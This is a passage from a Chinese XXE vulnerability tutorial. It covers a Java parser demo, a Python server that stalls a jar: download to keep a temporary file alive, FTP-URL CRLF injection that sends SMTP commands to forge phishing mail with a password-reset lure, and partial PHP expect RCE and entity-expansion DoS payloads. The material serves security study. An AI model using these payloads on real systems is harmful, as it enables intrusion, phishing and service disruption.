        {
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            DocumentBuilder db = dbf.newDocumentBuilder();
            Document doc = db.parse(new File("student.xml"));
            //获得根元素结点
            Element root = doc.getDocumentElement();
            parseElement(root);
        }
        private static void parseElement(Element element)
        {
            String tagName = element.getNodeName();
            NodeList children = element.getChildNodes();
            System.out.print("");
            for(int i = 0; i ");
                }
            }
            System.out.print("");
        }
    }
有了这个源码以后，我们需要在本地建立一个 xml 文件 ，我取名为 student.xml
**student.xml**
    ]>
    &remote;
**目录结构如下图：**
可以清楚地看到我的请求是向自己本地的 9999 端口发出的，那么9999 端口上有什么服务呢？实际上是我自己用 python 写的一个 TCP 服务器
**示例代码：**
**sever.py**
    import sys 
    import time 
    import threading 
    import socketserver 
    from urllib.parse import quote 
    import http.client as httpc 
    listen_host = 'localhost' 
    listen_port = 9999 
    jar_file = sys.argv[1]
    class JarRequestHandler(socketserver.BaseRequestHandler):  
        def handle(self):
            http_req = b''
            print('New connection:',self.client_address)
            while b'\r\n\r\n' not in http_req:
                try:
                    http_req += self.request.recv(4096)
                    print('Client req:\r\n',http_req.decode())
                    jf = open(jar_file, 'rb')
                    contents = jf.read()
                    headers = ('''HTTP/1.0 200 OK\r\n'''
                    '''Content-Type: application/java-archive\r\n\r\n''')
                    self.request.sendall(headers.encode('ascii'))
                    self.request.sendall(contents[:-1])
                    time.sleep(30)
                    print(30)
                    self.request.sendall(contents[-1:])
                except Exception as e:
                    print ("get error at:"+str(e))
    if __name__ == '__main__':
        jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) 
        print ('waiting for connection...') 
        server_thread = threading.Thread(target=jarserver.serve_forever) 
        server_thread.daemon = True 
        server_thread.start() 
        server_thread.join()
这个服务器的目的就是接受客户端的请求，然后向客户端发送一个我们运行时就传入的参数指定的文件，但是还没完，实际上我在这里加了一个
sleep(30)，这个的目的我后面再说
既然是文件上传，那我们又要回到 jar 协议解析文件的过程中了
> **jar 协议处理文件的过程：**
>
> (1) 下载 jar/zip 文件到临时文件中  
>  (2) 提取出我们指定的文件  
>  (3) 删除临时文件
那我们怎么找到这个临时的文件夹呢？不用想，肯定是通过报错的形式展现，如果我们请求的
    jar:http://localhost:9999/jar.zip!/1.php
1.php 在这个 jar.zip 中没有的话，java 解析器就会报错，说在这个临时文件中找不到这个文件
**如下图：**
既然找到了临时文件的路径，我们就要考虑怎么使用这个文件了（或者说怎么让这个文件能更长时间的停留在我们的系统之中，我想到的方式就是sleep()）但是还有一个问题，因为我们要利用的时候肯定是在文件没有完全传输成果的时候，因此为了文件的完整性，我考虑在传输前就使用
hex 编辑器在文件末尾添加垃圾字符，这样就能完美的解决这个问题
**下面是我的实验录屏：**
实验就到这一步了，怎么利用就看各位大佬的了（坏笑）
我后来在LCTF 2018 出了这样一个 CTF 题目，详细的 wp
可以看我的[这篇文章](http://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/)
### **实验七：钓鱼：**
如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF
注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb 的一篇文章 ）
Java支持在sun.net.ftp.impl.FtpClient中的ftp
URI。因此，我们可以指定用户名和密码，例如ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。
但是如果我们将%0D%0A
(CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：
**示例代码：**
    ftp://a%0D%0A
    EHLO%20a%0D%0A
    MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A
    RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A
    DATA%0D%0A
    From%3A%20support%40VULNERABLESYSTEM.com%0A
    To%3A%20victim%40gmail.com%0A
    Subject%3A%20test%0A
    %0A
    test!%0A
    %0D%0A
    .%0D%0A
    QUIT%0D%0A
    :PI:EMAIL:25
当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器：
**示例代码：**
    ftp://a
    EHLO a
    MAIL FROM: 
    RCPT TO: 
    DATA
    From: PI:EMAIL
    To: PI:EMAIL
    Subject: Reset your password
    We need to confirm your identity. Confirm your password here: http://PHISHING_URL.com
    .
    QUIT
    :PI:EMAIL:25
这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。
### **实验八：其他：**
除了上面实验中的一些常见利用以外还有一些不是很常用或者比较鸡肋的利用方式，为了完整性我在这一节简单的说一下：
#### **1.PHP expect RCE**
由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE
**示例代码：**
    ]>
    &cmd;
#### **2\. 利用 XXE 进行 DOS 攻击**
**示例代码：**
         ]>
         &lol9;
## **五、真实的 XXE 出现在哪**
我们刚刚说了那么多，都是只是我们对这个漏洞的理解，但是好像还没说这种漏洞出现在什么地方
如今的 web 时代，是一个前后端分离的时代，有人说 MVC
就是前后端分离，但我觉得这种分离的并不彻底，后端还是要尝试去调用渲染类去控制前端的渲染，我所说的前后端分离是，后端 api
只负责接受约定好要传入的数据，然后经过一系列的黑盒运算，将得到结果以 json 格式返回给前端，前端只负责坐享其成，拿到数据json.decode
就行了（这里的后端可以是后台代码，也可以是外部的api 接口，这里的前端可以是传统意义的前端，也可以是后台代码）
那么问题经常就出现在 api 接口能解析客户端传过来的 xml 代码，并且直接外部实体的引用，比如下面这个
### **实例一：模拟情况**